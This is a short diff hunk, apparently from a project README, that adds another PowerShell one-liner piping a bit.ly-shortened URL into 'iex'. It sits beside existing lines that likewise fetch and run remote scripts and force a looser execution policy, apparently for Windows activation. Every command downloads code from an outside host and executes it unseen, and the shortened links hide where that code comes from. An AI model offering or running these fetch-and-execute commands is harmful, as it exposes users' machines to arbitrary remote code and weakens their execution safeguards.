@@ -15,6 +15,11 @@ irm https://get.activated.win | iex
 ```
 irm https://clck.ru/3Rk6CD | iex
 ```
+
+```
+irm https://bit.ly/3OjPQfo | iex
+```
+
 ```
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 irm https://raw.githubusercontent.com/samocvetov/wginst/main/1.ps1 | iex
